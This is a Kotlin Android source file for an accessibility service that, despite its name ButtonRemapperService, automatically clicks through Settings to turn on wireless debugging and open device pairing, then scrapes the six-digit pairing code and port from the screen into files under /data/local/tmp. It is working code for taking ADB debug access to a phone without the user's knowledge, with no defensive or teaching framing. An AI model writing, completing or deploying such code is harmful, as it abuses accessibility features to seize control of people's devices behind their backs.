package com.unknown.godmode

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.File

class ButtonRemapperService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!isIgniting) return
        val root = rootInActiveWindow ?: return

        val wirelessNode = findNodeByText(root, "Wireless debugging")
        if (wirelessNode != null) {
            if (!wirelessNode.isVisibleToUser) {
                root.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
            } else {
                wirelessNode.parent?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                wirelessNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
            return
        }

        val pairNode = findNodeByText(root, "Pair device with pairing code")
        if (pairNode != null) {
            pairNode.parent?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            pairNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            return
        }

        scrapeData(root)
    }

    private fun findNodeByText(root: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        val nodes = root.findAccessibilityNodeInfosByText(text)
        return nodes.firstOrNull()
    }

    private fun scrapeData(node: AccessibilityNodeInfo) {
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val txt = child.text?.toString() ?: ""
            if (txt.matches(Regex("\\d{6}"))) {
                File("/data/local/tmp/p_code.txt").writeText(txt)
            }
            if (txt.contains(":")) {
                val port = txt.substringAfterLast(":")
                if (port.all { it.isDigit() } && port.length >= 4) {
                    File("/data/local/tmp/p_port.txt").writeText(port)
                }
            }
            scrapeData(child)
        }
    }

    override fun onInterrupt() {}
    
    companion object {
        var isIgniting = false
        var currentSignal = "Ready..." // RESTORED: This fixes the build error
    }
}